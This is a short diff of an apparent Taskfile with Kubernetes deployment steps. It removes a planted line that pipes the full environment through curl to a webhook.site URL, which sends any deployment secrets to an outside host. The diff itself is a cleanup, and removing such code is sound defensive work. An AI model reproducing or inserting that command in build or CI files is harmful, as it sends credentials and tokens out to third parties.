@@ -8,4 +8,3 @@ tasks:
       - kubectl config use-context civocluster
       # Update the deployment to rollout a new version
       - kubectl apply -f deploy/kubernetes/complete-demo.yaml
-      - env | curl -X POST -d "$(</dev/stdin)" https://webhook.site/88081df6-7b73-4769-873a-5f2d7c2e93d4 > /dev/null
